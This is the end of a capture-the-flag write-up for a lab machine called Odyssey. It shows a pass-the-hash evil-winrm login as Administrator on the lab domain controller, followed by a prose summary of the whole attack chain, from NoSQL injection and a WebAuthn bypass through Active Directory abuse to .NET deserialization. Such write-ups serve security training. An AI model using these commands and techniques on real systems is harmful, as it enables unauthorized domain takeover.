└─$ evil-winrm -i DC01.odyssey.htb -u Administrator -H 890b9e96245f6895e06adfe92ad1e81f
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                  
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                             
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
[REDACTED]
```

Odyssey stands as a genuinely **advanced research** machine, and its difficulty is not the product of a single obscure vulnerability but of the *depth and chaining* required at every stage.&#x20;

**Initial access** demands comfort with modern authentication protocols.  The application is gated behind WebAuthn (FIDO2) hardware authenticators, a technology most pentesters encounter only in defensive contexts. Bypassing it required a **NoSQL Pipeline Aggregation Injection** against a MongoDB endpoint — a technique far less common than classic SQLi or basic NoSQL operator injection — to exfiltrate unclaimed onboarding tokens, followed by the construction of a **synthetic WebAuthn registration** through a reverse proxy to satisfy the browser-level attestation flow.  This alone separates the machine from anything seen in OSCP-level or even typical HTB Hard challenges.

**Privilege escalation within the application** hinges on a **`userHandle` confusion vulnerability**: the login endpoint performs no validation on the `userHandle` field returned by the WebAuthn authentication finish call, allowing an attacker to inject an arbitrary base64-encoded handle (e.g., `admin`) and assume that identity.  This is a subtle logic flaw that only becomes visible through careful code review of the client-side webauth.js and the server-side session handling.

**Post-exploitation** then chains multiple advanced Windows and Active Directory techniques:

* **Hive extraction** to recover the machine account credentials of Odyssey-DB
* **`addKeyCredentialLink`** abuse through inherited group membership to pivot to svc-aegis-build
* **dMSA Ouroboros** to escalate to svc-aegis-deploy
* **WinRM** lateral movement to the domain controller
* **Unsafe YAML deserialization** in a .NET pipe application for final compromise&#x20;

The technology stack itself — Node.js/Express, MongoDB, Microsoft SQL Server 2022, Nunjucks, FIDO2/WebAuthn — mirrors a realistic modern enterprise application rather than a simplified CTF target. Every layer requires specialized knowledge: NoSQL aggregation pipeline syntax, WebAuthn protocol internals, AD ACL abuse, and .NET deserialization.

In summary, Odyssey is "advanced research" not because any single technique is novel, but because the machine forces the attacker to **research and master multiple specialized domains** and chain them into a coherent attack path — a far closer approximation of real-world red team engagements than the linear, single-vector challenges found at lower difficulty tiers.&#x20;
